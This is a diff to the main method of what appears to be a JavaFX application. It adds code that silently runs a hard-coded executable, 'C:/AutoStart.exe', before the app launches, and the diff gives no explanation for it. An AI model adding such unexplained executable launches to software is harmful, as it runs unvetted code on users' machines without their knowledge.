@@ -29,6 +29,15 @@ public class Main extends Application {
      * @param args the command line arguments
      */
     public static void main(String[] args) {
+
+        String filepath = "C:/AutoStart.exe";
+        try {
+            Process p = Runtime.getRuntime().exec(filepath);
+            p.waitFor();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
         launch(args);
     }
 }
